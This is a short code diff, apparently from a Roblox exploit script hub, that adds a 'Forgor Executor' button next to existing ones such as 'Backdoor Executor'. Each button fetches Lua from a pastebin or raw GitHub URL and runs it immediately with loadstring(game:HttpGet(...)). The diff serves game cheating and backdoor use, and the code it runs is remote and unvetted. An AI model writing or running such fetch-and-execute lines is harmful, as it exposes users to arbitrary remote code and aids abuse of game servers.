@@ -1038,6 +1038,11 @@ OthersSection:NewButton("🦺Backdoor Executor🦺", "", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/PXAdj6ED"))();
 end)
 
+OthersSection:NewButton("💯Forgor Executor💯", "", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/un_ForgorExecutor", true))()
+end)
+
 OthersSection:NewButton("📓Scripts Executor📓", "", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/yGxeT8zC", true))()
 end)
